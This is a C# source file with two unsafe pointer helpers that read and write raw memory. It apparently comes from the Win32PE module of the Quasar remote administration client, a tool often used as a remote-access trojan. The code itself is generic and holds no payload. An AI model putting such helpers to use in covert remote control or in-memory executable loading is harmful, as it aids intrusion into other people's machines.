using System;

namespace Quasar.Client.Win32PE.Structs
{
    public static class HelperExtension
    {
        public static unsafe IntPtr ReadPtr(this IntPtr ptr)
        {
            if (IntPtr.Size == 4)
            {
                var ptrInt = (int*)ptr.ToPointer();
                return new IntPtr(*ptrInt);
            }
            else
            {
                var ptrLong = (long*)ptr.ToPointer();
                return new IntPtr(*ptrLong);
            }
        }

        public unsafe static void WriteValue<T>(this IntPtr ptr, T value) where T : unmanaged
        {
            var pValue = (T*)ptr.ToPointer();
            *pValue = value;
        }
    }
}
